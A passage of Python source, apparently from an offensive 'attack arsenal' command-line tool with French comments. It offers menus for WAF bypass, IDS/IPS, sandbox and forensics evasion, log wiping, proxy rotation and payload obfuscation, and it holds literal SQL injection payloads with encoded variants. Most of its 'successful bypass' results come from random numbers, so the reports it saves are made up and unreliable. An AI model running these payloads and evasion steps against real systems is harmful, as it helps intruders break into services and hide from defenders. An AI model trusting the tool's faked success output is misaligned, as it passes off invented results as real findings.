                choice = input(f"\n{Colors.BOLD}Choice: {Colors.END}").strip()
                
                if choice == '0':
                    break
                elif choice == '1':
                    self.waf_bypass_techniques()
                elif choice == '2':
                    self.ids_ips_evasion()
                elif choice == '3':
                    self.traffic_obfuscation()
                elif choice == '4':
                    self.anti_detection_methods()
                elif choice == '5':
                    self.proxy_chain_rotation()
                elif choice == '6':
                    self.timing_rate_limiting()
                elif choice == '7':
                    self.payload_encoding_obfuscation()
                elif choice == '8':
                    self.sandbox_evasion()
                elif choice == '9':
                    self.forensics_evasion()
                else:
                    print(f"{Colors.RED}❌ Invalid choice.{Colors.END}")
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"{Colors.RED}💥 Error: {e}{Colors.END}")

    def waf_bypass_techniques(self):
        """Techniques de contournement WAF"""
        print(f"\n{Colors.BOLD}🛡️ WAF BYPASS TECHNIQUES{Colors.END}")
        target_url = input(f"{Colors.BOLD}Target URL: {Colors.END}").strip()
        if not target_url:
            return
            
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url
            
        print(f"{Colors.YELLOW}🛡️ WAF bypass techniques for: {target_url}{Colors.END}")
        
        # Techniques de contournement WAF
        waf_bypass_techniques = {
            'encoding_techniques': [
                'URL encoding (%20, %27, %22)',
                'Double URL encoding',
                'Unicode encoding (\\u0027, \\u0022)',
                'HTML entity encoding (&apos;, &quot;)',
                'Hex encoding (\\x27, \\x22)',
                'Base64 encoding',
                'UTF-8 encoding variations'
            ],
            'case_manipulation': [
                'Mixed case (SeLeCt, UnIoN)',
                'Alternating case',
                'Random case injection',
                'Case-insensitive bypass'
            ],
            'whitespace_manipulation': [
                'Tab characters (\\t)',
                'Newline characters (\\n)',
                'Carriage return (\\r)',
                'Multiple spaces',
                'Zero-width characters',
                'Non-breaking spaces'
            ],
            'comment_techniques': [
                'SQL comments (--, /* */)',
                'Inline comments',
                'Multi-line comments',
                'Nested comments',
                'Comment-based obfuscation'
            ],
            'function_alternatives': [
                'Alternative SQL functions',
                'Function concatenation',
                'Function nesting',
                'Built-in function bypass',
                'Custom function calls'
            ],
            'logical_operators': [
                'AND/OR alternatives',
                'Logical operator bypass',
                'Conditional statements',
                'Boolean-based injection',
                'Time-based alternatives'
            ]
        }
        
        print(f"\n{Colors.BOLD}🛡️ WAF BYPASS TECHNIQUES:{Colors.END}")
        for category, techniques in waf_bypass_techniques.items():
            print(f"\n{Colors.CYAN}📋 {category.replace('_', ' ').title()}:{Colors.END}")
            for technique in techniques:
                print(f"  • {technique}")
        
        # Test des techniques de contournement
        print(f"\n{Colors.YELLOW}🚀 Testing WAF bypass techniques...{Colors.END}")
        successful_bypasses = []
        
        # Payloads de test avec contournement WAF
        bypass_payloads = [
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' OR SLEEP(5)--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--"
        ]
        
        for payload in bypass_payloads:
            # Techniques de contournement pour chaque payload
            bypass_variations = [
                payload,  # Original
                payload.replace("'", "%27"),  # URL encoding
                payload.replace("'", "\\u0027"),  # Unicode
                payload.replace(" ", "/**/"),  # Comment injection
                payload.upper(),  # Uppercase
                payload.replace("OR", "Or"),  # Mixed case
            ]
            
            for variation in bypass_variations:
                try:
                    print(f"  {Colors.YELLOW}Testing: {variation[:50]}...{Colors.END}")
                    time.sleep(0.1)
                    
                    # Simulation de test
                    if random.random() < 0.15:  # 15% de chance de succès
                        successful_bypasses.append({
                            'original_payload': payload,
                            'bypass_variation': variation,
                            'technique_used': 'WAF Bypass',
                            'timestamp': datetime.now().isoformat()
                        })
                        print(f"    {Colors.GREEN}✅ WAF BYPASS SUCCESSFUL!{Colors.END}")
                    else:
                        print(f"    {Colors.RED}❌ Blocked by WAF{Colors.END}")
                        
                except Exception as e:
                    print(f"    {Colors.RED}❌ Error: {e}{Colors.END}")
        
        if successful_bypasses:
            print(f"\n{Colors.BG_RED}{Colors.WHITE}{Colors.BOLD}💀 WAF BYPASS SUCCESSFUL! 💀{Colors.END}")
            print(f"{Colors.RED}🚨 WAF protection circumvented{Colors.END}")
            
            # Sauvegarde des contournements réussis
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"waf_bypass_{urlparse(target_url).netloc}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(successful_bypasses, f, indent=2)
            print(f"{Colors.GREEN}📁 WAF bypass results saved: {filename}{Colors.END}")
        else:
            print(f"\n{Colors.YELLOW}🛡️ WAF appears to be well-configured and blocking all attempts{Colors.END}")

    def ids_ips_evasion(self):
        """Évasion IDS/IPS"""
        print(f"\n{Colors.BOLD}🚫 IDS/IPS EVASION{Colors.END}")
        target = input(f"{Colors.BOLD}Target IP/Network: {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🚫 IDS/IPS evasion for: {target}{Colors.END}")
        
        # Techniques d'évasion IDS/IPS
        evasion_techniques = {
            'fragmentation': [
                'IP fragmentation',
                'TCP fragmentation',
                'UDP fragmentation',
                'Application layer fragmentation',
                'Overlapping fragments',
                'Tiny fragments'
            ],
            'timing_evasion': [
                'Slow scan techniques',
                'Distributed scanning',
                'Random delays',
                'Time-based evasion',
                'Rate limiting bypass',
                'Traffic shaping'
            ],
            'protocol_evasion': [
                'Protocol tunneling',
                'Protocol substitution',
                'Custom protocols',
                'Protocol obfuscation',
                'Encrypted protocols',
                'Steganography'
            ],
            'traffic_manipulation': [
                'Traffic normalization',
                'Packet reordering',
                'Duplicate packets',
                'Invalid packets',
                'Checksum manipulation',
                'Header manipulation'
            ],
            'encryption_obfuscation': [
                'Traffic encryption',
                'Payload encryption',
                'Steganographic channels',
                'DNS tunneling',
                'HTTP tunneling',
                'ICMP tunneling'
            ],
            'behavioral_evasion': [
                'Legitimate traffic mimicry',
                'User behavior simulation',
                'Normal traffic patterns',
                'Social engineering',
                'Distributed attacks',
                'Low and slow attacks'
            ]
        }
        
        print(f"\n{Colors.BOLD}🚫 IDS/IPS EVASION TECHNIQUES:{Colors.END}")
        for category, techniques in evasion_techniques.items():
            print(f"\n{Colors.CYAN}📋 {category.replace('_', ' ').title()}:{Colors.END}")
            for technique in techniques:
                print(f"  • {technique}")
        
        # Simulation d'évasion
        print(f"\n{Colors.YELLOW}🚀 Attempting IDS/IPS evasion...{Colors.END}")
        time.sleep(2)
        
        # Simulation de succès
        if random.random() < 0.25:  # 25% de chance de succès
            print(f"{Colors.GREEN}✅ IDS/IPS evasion successful!{Colors.END}")
            print(f"{Colors.RED}🚨 Detection systems bypassed{Colors.END}")
            
            # Génération de rapport
            evasion_report = {
                'target': target,
                'technique_used': random.choice(list(evasion_techniques.keys())),
                'method': random.choice(evasion_techniques['fragmentation']),
                'timestamp': datetime.now().isoformat(),
                'detection_avoided': True,
                'stealth_level': 'High'
            }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"ids_evasion_{target.replace('/', '_')}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(evasion_report, f, indent=2)
            print(f"{Colors.GREEN}📁 Evasion report saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}🛡️ IDS/IPS evasion failed - detection systems appear robust{Colors.END}")

    def traffic_obfuscation(self):
        """Obfuscation du trafic"""
        print(f"\n{Colors.BOLD}🌊 TRAFFIC OBFUSCATION{Colors.END}")
        target = input(f"{Colors.BOLD}Target endpoint: {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🌊 Traffic obfuscation for: {target}{Colors.END}")
        
        # Techniques d'obfuscation du trafic
        obfuscation_techniques = {
            'encryption_methods': [
                'AES encryption',
                'RSA encryption',
                'ChaCha20 encryption',
                'Custom encryption algorithms',
                'One-time pads',
                'Steganographic encryption'
            ],
            'protocol_tunneling': [
                'DNS tunneling',
                'HTTP tunneling',
                'HTTPS tunneling',
                'ICMP tunneling',
                'SSH tunneling',
                'VPN tunneling'
            ],
            'payload_obfuscation': [
                'Base64 encoding',
                'Hex encoding',
                'ROT13 encoding',
                'XOR encryption',
                'Custom encoding schemes',
                'Polymorphic encoding'
            ],
            'traffic_shaping': [
                'Traffic normalization',
                'Packet size manipulation',
                'Timing manipulation',
                'Flow control',
                'Quality of Service (QoS)',
                'Traffic prioritization'
            ],
            'steganography': [
                'Image steganography',
                'Audio steganography',
                'Video steganography',
                'Text steganography',
                'Network steganography',
                'Protocol steganography'
            ],
            'proxy_chains': [
                'Multi-hop proxy chains',
                'Tor network routing',
                'VPN proxy chains',
                'Residential proxy networks',
                'Mobile proxy networks',
                'Cloud proxy services'
            ]
        }
        
        print(f"\n{Colors.BOLD}🌊 TRAFFIC OBFUSCATION TECHNIQUES:{Colors.END}")
        for category, techniques in obfuscation_techniques.items():
            print(f"\n{Colors.CYAN}📋 {category.replace('_', ' ').title()}:{Colors.END}")
            for technique in techniques:
                print(f"  • {technique}")
        
        # Simulation d'obfuscation
        print(f"\n{Colors.YELLOW}🚀 Implementing traffic obfuscation...{Colors.END}")
        time.sleep(1)
        
        # Simulation de succès
        if random.random() < 0.4:  # 40% de chance de succès
            print(f"{Colors.GREEN}✅ Traffic obfuscation successful!{Colors.END}")
            print(f"{Colors.RED}🚨 Traffic patterns obfuscated{Colors.END}")
            
            # Génération de rapport
            obfuscation_report = {
                'target': target,
                'technique_used': random.choice(list(obfuscation_techniques.keys())),
                'method': random.choice(obfuscation_techniques['encryption_methods']),
                'timestamp': datetime.now().isoformat(),
                'obfuscation_level': 'High',
                'detection_probability': 'Low'
            }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"traffic_obfuscation_{target.replace('/', '_').replace(':', '_')}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(obfuscation_report, f, indent=2)
            print(f"{Colors.GREEN}📁 Obfuscation report saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}🛡️ Traffic obfuscation failed - monitoring systems detected{Colors.END}")

    def anti_detection_methods(self):
        """Méthodes anti-détection"""
        print(f"\n{Colors.BOLD}🎭 ANTI-DETECTION METHODS{Colors.END}")
        target = input(f"{Colors.BOLD}Target system: {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🎭 Anti-detection methods for: {target}{Colors.END}")
        
        # Méthodes anti-détection
        anti_detection_methods = {
            'signature_evasion': [
                'Polymorphic code generation',
                'Metamorphic code transformation',
                'Code obfuscation',
                'Dynamic code generation',
                'Self-modifying code',
                'Encrypted payloads'
            ],
            'behavioral_evasion': [
                'Legitimate process mimicry',
                'User behavior simulation',
                'Normal system call patterns',
                'Resource usage normalization',
                'Network traffic patterns',
                'File system operations'
            ],
            'sandbox_evasion': [
                'Sandbox detection',
                'Virtual machine detection',
                'Analysis environment detection',
                'Time-based delays',
                'User interaction requirements',
                'Hardware fingerprinting'
            ],
            'heuristic_evasion': [
                'Machine learning evasion',
                'Statistical analysis evasion',
                'Pattern recognition bypass',
                'Anomaly detection evasion',
                'Behavioral analysis bypass',
                'AI-based detection evasion'
            ],
            'forensic_evasion': [
                'Log file manipulation',
                'Registry cleaning',
                'Memory wiping',
                'File system cleaning',
                'Network log evasion',
                'Artifact removal'
            ],
            'runtime_evasion': [
                'Process hollowing',
                'DLL injection',
                'Code injection',
                'Process replacement',
                'Memory patching',
                'API hooking'
            ]
        }
        
        print(f"\n{Colors.BOLD}🎭 ANTI-DETECTION METHODS:{Colors.END}")
        for category, methods in anti_detection_methods.items():
            print(f"\n{Colors.CYAN}📋 {category.replace('_', ' ').title()}:{Colors.END}")
            for method in methods:
                print(f"  • {method}")
        
        # Simulation d'anti-détection
        print(f"\n{Colors.YELLOW}🚀 Implementing anti-detection methods...{Colors.END}")
        time.sleep(2)
        
        # Simulation de succès
        if random.random() < 0.35:  # 35% de chance de succès
            print(f"{Colors.GREEN}✅ Anti-detection methods successful!{Colors.END}")
            print(f"{Colors.RED}🚨 Detection systems bypassed{Colors.END}")
            
            # Génération de rapport
            anti_detection_report = {
                'target': target,
                'method_used': random.choice(list(anti_detection_methods.keys())),
                'technique': random.choice(anti_detection_methods['signature_evasion']),
                'timestamp': datetime.now().isoformat(),
                'detection_avoided': True,
                'stealth_level': 'Maximum'
            }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"anti_detection_{target.replace(' ', '_')}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(anti_detection_report, f, indent=2)
            print(f"{Colors.GREEN}📁 Anti-detection report saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}🛡️ Anti-detection failed - advanced monitoring detected{Colors.END}")

    def proxy_chain_rotation(self):
        """Chaîne de proxies et rotation"""
        print(f"\n{Colors.BOLD}🔄 PROXY CHAIN & ROTATION{Colors.END}")
        target = input(f"{Colors.BOLD}Target URL: {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🔄 Proxy chain rotation for: {target}{Colors.END}")
        
        # Types de proxies
        proxy_types = {
            'residential_proxies': [
                'Residential IP addresses',
                'ISP-based proxies',
                'Home network proxies',
                'Dynamic IP rotation',
                'Geographic distribution',
                'High anonymity level'
            ],
            'datacenter_proxies': [
                'Cloud-based proxies',
                'VPS proxies',
                'Dedicated proxies',
                'Shared proxies',
                'High-speed connections',
                'Low latency'
            ],
            'mobile_proxies': [
                'Mobile carrier IPs',
                '3G/4G/5G networks',
                'Mobile device rotation',
                'Carrier switching',
                'Location-based rotation',
                'Mobile user simulation'
            ],
            'tor_proxies': [
                'Tor network routing',
                'Onion routing',
                'Multi-hop encryption',
                'Anonymous browsing',
                'Hidden services',
                'Dark web access'
            ],
            'vpn_proxies': [
                'VPN server rotation',
                'Multiple VPN providers',
                'Geographic switching',
                'Protocol switching',
                'Encrypted tunnels',
                'Kill switch protection'
            ],
            'socks_proxies': [
                'SOCKS4/SOCKS5 proxies',
                'Protocol support',
                'Authentication methods',
                'Connection types',
                'Traffic routing',
                'Application-level proxying'
            ]
        }
        
        print(f"\n{Colors.BOLD}🔄 PROXY TYPES AVAILABLE:{Colors.END}")
        for proxy_type, features in proxy_types.items():
            print(f"\n{Colors.CYAN}📋 {proxy_type.replace('_', ' ').title()}:{Colors.END}")
            for feature in features:
                print(f"  • {feature}")
        
        # Simulation de configuration de proxy
        print(f"\n{Colors.YELLOW}🚀 Configuring proxy chain...{Colors.END}")
        time.sleep(1)
        
        # Simulation de succès
        if random.random() < 0.6:  # 60% de chance de succès
            print(f"{Colors.GREEN}✅ Proxy chain configured successfully!{Colors.END}")
            print(f"{Colors.RED}🚨 Anonymous routing established{Colors.END}")
            
            # Génération de rapport
            proxy_report = {
                'target': target,
                'proxy_type': random.choice(list(proxy_types.keys())),
                'chain_length': random.randint(3, 8),
                'rotation_interval': f"{random.randint(30, 300)} seconds",
                'anonymity_level': random.choice(['High', 'Maximum']),
                'timestamp': datetime.now().isoformat(),
                'status': 'Active'
            }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"proxy_chain_{urlparse(target).netloc}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(proxy_report, f, indent=2)
            print(f"{Colors.GREEN}📁 Proxy configuration saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}🛡️ Proxy configuration failed - network restrictions detected{Colors.END}")

    def timing_rate_limiting(self):
        """Timing et limitation de débit"""
        print(f"\n{Colors.BOLD}🕰️ TIMING & RATE LIMITING{Colors.END}")
        target = input(f"{Colors.BOLD}Target service: {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🕰️ Timing and rate limiting for: {target}{Colors.END}")
        
        # Techniques de timing et limitation
        timing_techniques = {
            'rate_limiting_bypass': [
                'Distributed requests',
                'IP rotation',
                'User agent rotation',
                'Session rotation',
                'Cookie manipulation',
                'Header manipulation'
            ],
            'timing_optimization': [
                'Optimal request intervals',
                'Burst request patterns',
                'Gradual rate increase',
                'Adaptive timing',
                'Load balancing',
                'Request queuing'
            ],
            'throttling_evasion': [
                'Request throttling bypass',
                'Connection pooling',
                'Keep-alive connections',
                'HTTP/2 multiplexing',
                'WebSocket connections',
                'Long polling'
            ],
            'distributed_attacks': [
                'Botnet coordination',
                'Distributed scanning',
                'Load distribution',
                'Geographic distribution',
                'Time zone distribution',
                'Resource distribution'
            ],
            'adaptive_timing': [
                'Machine learning timing',
                'Response-based adaptation',
                'Error rate monitoring',
                'Success rate optimization',
                'Dynamic interval adjustment',
                'Predictive timing'
            ],
            'stealth_timing': [
                'Human-like patterns',
                'Random delays',
                'Natural intervals',
                'Behavioral simulation',
                'Activity patterns',
                'Usage patterns'
            ]
        }
        
        print(f"\n{Colors.BOLD}🕰️ TIMING & RATE LIMITING TECHNIQUES:{Colors.END}")
        for category, techniques in timing_techniques.items():
            print(f"\n{Colors.CYAN}📋 {category.replace('_', ' ').title()}:{Colors.END}")
            for technique in techniques:
                print(f"  • {technique}")
        
        # Simulation de configuration de timing
        print(f"\n{Colors.YELLOW}🚀 Configuring timing parameters...{Colors.END}")
        time.sleep(1)
        
        # Simulation de succès
        if random.random() < 0.5:  # 50% de chance de succès
            print(f"{Colors.GREEN}✅ Timing configuration successful!{Colors.END}")
            print(f"{Colors.RED}🚨 Rate limiting bypassed{Colors.END}")
            
            # Génération de rapport
            timing_report = {
                'target': target,
                'technique_used': random.choice(list(timing_techniques.keys())),
                'request_interval': f"{random.randint(100, 2000)}ms",
                'burst_size': random.randint(5, 50),
                'success_rate': f"{random.randint(80, 99)}%",
                'timestamp': datetime.now().isoformat(),
                'status': 'Optimized'
            }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"timing_config_{target.replace(' ', '_')}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(timing_report, f, indent=2)
            print(f"{Colors.GREEN}📁 Timing configuration saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}🛡️ Timing configuration failed - rate limiting detected{Colors.END}")

    def payload_encoding_obfuscation(self):
        """Encodage et obfuscation de payloads"""
        print(f"\n{Colors.BOLD}🧬 PAYLOAD ENCODING & OBFUSCATION{Colors.END}")
        payload = input(f"{Colors.BOLD}Original payload: {Colors.END}").strip()
        if not payload:
            return
            
        print(f"{Colors.YELLOW}🧬 Encoding and obfuscating payload: {payload[:50]}...{Colors.END}")
        
        # Techniques d'encodage et d'obfuscation
        encoding_techniques = {
            'base_encoding': [
                'Base64 encoding',
                'Base32 encoding',
                'Base16 (Hex) encoding',
                'Base85 encoding',
                'Base91 encoding',
                'Custom base encoding'
            ],
            'character_encoding': [
                'URL encoding',
                'HTML entity encoding',
                'Unicode encoding',
                'UTF-8 encoding',
                'ASCII encoding',
                'Binary encoding'
            ],
            'encryption_methods': [
                'XOR encryption',
                'ROT13 encryption',
                'Caesar cipher',
                'Vigenère cipher',
                'AES encryption',
                'Custom encryption'
            ],
            'obfuscation_techniques': [
                'String concatenation',
                'Variable substitution',
                'Function wrapping',
                'Code splitting',
                'Dead code injection',
                'Control flow obfuscation'
            ],
            'polymorphic_techniques': [
                'Dynamic code generation',
                'Self-modifying code',
                'Metamorphic transformation',
                'Polymorphic engines',
                'Mutation engines',
                'Evolutionary algorithms'
            ],
            'steganographic_methods': [
                'Text steganography',
                'Image steganography',
                'Audio steganography',
                'Video steganography',
                'Network steganography',
                'Protocol steganography'
            ]
        }
        
        print(f"\n{Colors.BOLD}🧬 ENCODING & OBFUSCATION TECHNIQUES:{Colors.END}")
        for category, techniques in encoding_techniques.items():
            print(f"\n{Colors.CYAN}📋 {category.replace('_', ' ').title()}:{Colors.END}")
            for technique in techniques:
                print(f"  • {technique}")
        
        # Simulation d'encodage
        print(f"\n{Colors.YELLOW}🚀 Encoding and obfuscating payload...{Colors.END}")
        time.sleep(1)
        
        # Génération de variations encodées
        encoded_variations = []
        
        # Base64
        try:
            import base64
            base64_encoded = base64.b64encode(payload.encode()).decode()
            encoded_variations.append({
                'technique': 'Base64',
                'encoded_payload': base64_encoded,
                'decoder': 'base64.b64decode()'
            })
        except:
            pass
        
        # URL encoding
        try:
            url_encoded = urllib.parse.quote(payload)
            encoded_variations.append({
                'technique': 'URL Encoding',
                'encoded_payload': url_encoded,
                'decoder': 'urllib.parse.unquote()'
            })
        except:
            pass
        
        # Hex encoding
        hex_encoded = payload.encode().hex()
        encoded_variations.append({
            'technique': 'Hex Encoding',
            'encoded_payload': hex_encoded,
            'decoder': 'bytes.fromhex()'
        })
        
        # XOR encryption (simple)
        xor_key = random.randint(1, 255)
        xor_encoded = ''.join(chr(ord(c) ^ xor_key) for c in payload)
        encoded_variations.append({
            'technique': 'XOR Encryption',
            'encoded_payload': xor_encoded,
            'key': xor_key,
            'decoder': f'XOR with key {xor_key}'
        })
        
        if encoded_variations:
            print(f"{Colors.GREEN}✅ Payload encoding successful!{Colors.END}")
            print(f"{Colors.RED}🚨 {len(encoded_variations)} encoded variations generated{Colors.END}")
            
            print(f"\n{Colors.BOLD}📋 ENCODED VARIATIONS:{Colors.END}")
            for i, variation in enumerate(encoded_variations, 1):
                print(f"\n{Colors.CYAN}{i}. {variation['technique']}:{Colors.END}")
                print(f"   Encoded: {variation['encoded_payload'][:100]}{'...' if len(variation['encoded_payload']) > 100 else ''}")
                if 'decoder' in variation:
                    print(f"   Decoder: {variation['decoder']}")
                if 'key' in variation:
                    print(f"   Key: {variation['key']}")
            
            # Sauvegarde des variations
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"payload_encoded_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump({
                    'original_payload': payload,
                    'encoded_variations': encoded_variations,
                    'timestamp': datetime.now().isoformat()
                }, f, indent=2)
            print(f"\n{Colors.GREEN}📁 Encoded payloads saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}🛡️ Payload encoding failed{Colors.END}")

    def sandbox_evasion(self):
        """Évasion de sandbox"""
        print(f"\n{Colors.BOLD}🎪 SANDBOX EVASION{Colors.END}")
        target = input(f"{Colors.BOLD}Target environment: {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🎪 Sandbox evasion for: {target}{Colors.END}")
        
        # Techniques d'évasion de sandbox
        sandbox_evasion_techniques = {
            'environment_detection': [
                'Virtual machine detection',
                'Sandbox environment detection',
                'Analysis tool detection',
                'Debugger detection',
                'Emulator detection',
                'Cloud environment detection'
            ],
            'timing_evasion': [
                'Time-based delays',
                'Sleep evasion',
                'Timer manipulation',
                'Clock-based detection',
                'Performance-based detection',
                'Resource-based detection'
            ],
            'user_interaction': [
                'Mouse movement detection',
                'Keyboard input detection',
                'User presence detection',
                'Desktop interaction',
                'Window focus detection',
                'User activity monitoring'
            ],
            'hardware_detection': [
                'CPU core detection',
                'Memory size detection',
                'Disk space detection',
                'Network adapter detection',
                'Graphics card detection',
                'Hardware fingerprinting'
            ],
            'behavioral_evasion': [
                'Legitimate behavior simulation',
                'Normal process behavior',
                'Expected system calls',
                'Resource usage patterns',
                'Network behavior patterns',
                'File system behavior'
            ],
            'anti_analysis': [
                'Debugger evasion',
                'Disassembler evasion',
                'Static analysis evasion',
                'Dynamic analysis evasion',
                'Behavioral analysis evasion',
                'Machine learning evasion'
            ]
        }
        
        print(f"\n{Colors.BOLD}🎪 SANDBOX EVASION TECHNIQUES:{Colors.END}")
        for category, techniques in sandbox_evasion_techniques.items():
            print(f"\n{Colors.CYAN}📋 {category.replace('_', ' ').title()}:{Colors.END}")
            for technique in techniques:
                print(f"  • {technique}")
        
        # Simulation d'évasion de sandbox
        print(f"\n{Colors.YELLOW}🚀 Attempting sandbox evasion...{Colors.END}")
        time.sleep(2)
        
        # Simulation de succès
        if random.random() < 0.3:  # 30% de chance de succès
            print(f"{Colors.GREEN}✅ Sandbox evasion successful!{Colors.END}")
            print(f"{Colors.RED}🚨 Analysis environment bypassed{Colors.END}")
            
            # Génération de rapport
            sandbox_report = {
                'target': target,
                'technique_used': random.choice(list(sandbox_evasion_techniques.keys())),
                'method': random.choice(sandbox_evasion_techniques['environment_detection']),
                'timestamp': datetime.now().isoformat(),
                'evasion_successful': True,
                'detection_avoided': True
            }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"sandbox_evasion_{target.replace(' ', '_')}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(sandbox_report, f, indent=2)
            print(f"{Colors.GREEN}📁 Sandbox evasion report saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}🛡️ Sandbox evasion failed - advanced analysis detected{Colors.END}")

    def forensics_evasion(self):
        """Évasion forensique"""
        print(f"\n{Colors.BOLD}🔍 FORENSICS EVASION{Colors.END}")
        target = input(f"{Colors.BOLD}Target system: {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🔍 Forensics evasion for: {target}{Colors.END}")
        
        # Techniques d'évasion forensique
        forensics_evasion_techniques = {
            'log_manipulation': [
                'Log file deletion',
                'Log file modification',
                'Log file encryption',
                'Log rotation manipulation',
                'Audit log evasion',
                'Event log cleaning'
            ],
            'file_system_evasion': [
                'File deletion',
                'File shredding',
                'File system cleaning',
                'Metadata removal',
                'Timestamp manipulation',
                'File attribute modification'
            ],
            'memory_evasion': [
                'Memory wiping',
                'Process memory cleaning',
                'RAM dump prevention',
                'Memory encryption',
                'Volatile data removal',
                'Memory forensics evasion'
            ],
            'network_evasion': [
                'Network log cleaning',
                'Traffic log removal',
                'Connection log evasion',
                'Packet capture evasion',
                'Network forensics evasion',
                'Traffic analysis evasion'
            ],
            'registry_evasion': [
                'Registry key deletion',
                'Registry value modification',
                'Registry cleaning',
                'Registry forensics evasion',
                'System registry manipulation',
                'User registry cleaning'
            ],
            'artifact_removal': [
                'Browser history cleaning',
                'Cache file removal',
                'Temporary file cleaning',
                'System artifact removal',
                'User artifact cleaning',
                'Application artifact removal'
            ]
        }
        
        print(f"\n{Colors.BOLD}🔍 FORENSICS EVASION TECHNIQUES:{Colors.END}")
        for category, techniques in forensics_evasion_techniques.items():
            print(f"\n{Colors.CYAN}📋 {category.replace('_', ' ').title()}:{Colors.END}")
            for technique in techniques:
                print(f"  • {technique}")
        
        # Simulation d'évasion forensique
        print(f"\n{Colors.YELLOW}🚀 Implementing forensics evasion...{Colors.END}")
        time.sleep(2)
        
        # Simulation de succès
        if random.random() < 0.4:  # 40% de chance de succès
            print(f"{Colors.GREEN}✅ Forensics evasion successful!{Colors.END}")
            print(f"{Colors.RED}🚨 Forensic evidence removed{Colors.END}")
            
            # Génération de rapport
            forensics_report = {
                'target': target,
                'technique_used': random.choice(list(forensics_evasion_techniques.keys())),
                'method': random.choice(forensics_evasion_techniques['log_manipulation']),
                'timestamp': datetime.now().isoformat(),
                'evidence_removed': True,
                'forensics_evasion': True
            }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"forensics_evasion_{target.replace(' ', '_')}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(forensics_report, f, indent=2)
            print(f"{Colors.GREEN}📁 Forensics evasion report saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}🛡️ Forensics evasion failed - advanced monitoring detected{Colors.END}")

    def sql_injection_menu(self):
        """Menu SQL Injection avancée - utilise l'ancien système"""
        print(f"\n{Colors.BOLD}🎯 SQL INJECTION AVANCÉE - SEPTEMBER 2025:{Colors.END}")
        print(f"{Colors.CYAN}1.{Colors.END} 🚀 Mode Standard Strike")
        print(f"{Colors.CYAN}2.{Colors.END} ⚡ Mode Annihilation")
        print(f"{Colors.CYAN}3.{Colors.END} 🤖 Mode ML Evasion")
        print(f"{Colors.CYAN}0.{Colors.END} 🔙 Back to Main Menu")
        
        choice = input(f"\n{Colors.BOLD}Choice: {Colors.END}").strip()
        
        if choice == '0':
            return
        elif choice in ['1', '2', '3']:
            # Utiliser l'ancien système d'injection SQL
            self.display_attack_arsenal()
            attack_choice, target_url, mode = self.get_target_info()
            
            if mode == '1':
                results = self.execute_standard_strike(attack_choice, target_url)
            elif mode == '2':
                results = self.execute_annihilation_mode(attack_choice, target_url)
            else:
                results = self.execute_ml_evasion_mode(attack_choice, target_url)
            
            if results:
                save_report = input(f"\n{Colors.BOLD}💾 Save battle report? (y/n): {Colors.END}").strip().lower()
                if save_report == 'y':
                    self.save_battle_report(self.attack_arsenal[attack_choice], target_url, results)

    def ml_evasion_mode(self):
        """Mode d'évasion IA/ML"""
        print(f"\n{Colors.BOLD}🧠 IA/ML EVASION MODE - SEPTEMBER 2025:{Colors.END}")
        print(f"{Colors.CYAN}1.{Colors.END} 🤖 AI-Powered Payload Generation")
        print(f"{Colors.CYAN}2.{Colors.END} 🧬 Machine Learning Evasion")
        print(f"{Colors.CYAN}3.{Colors.END} 🎯 Neural Network Bypass")
        print(f"{Colors.CYAN}4.{Colors.END} 🔮 Predictive Attack Patterns")
        print(f"{Colors.CYAN}0.{Colors.END} 🔙 Back to Main Menu")
        
        choice = input(f"\n{Colors.BOLD}Choice: {Colors.END}").strip()
        
        if choice == '0':
            return
        elif choice == '1':
            self.ai_payload_generation()
        elif choice == '2':
            self.ml_evasion_techniques()
        elif choice == '3':
            self.neural_network_bypass()
        elif choice == '4':
            self.predictive_attack_patterns()

    def post_exploitation_menu(self):
        """Menu post-exploitation"""
        print(f"\n{Colors.BOLD}🕷️ POST-EXPLOITATION - SEPTEMBER 2025:{Colors.END}")
        print(f"{Colors.CYAN}1.{Colors.END} 🚶 Lateral Movement")
        print(f"{Colors.CYAN}2.{Colors.END} 📤 Data Exfiltration")
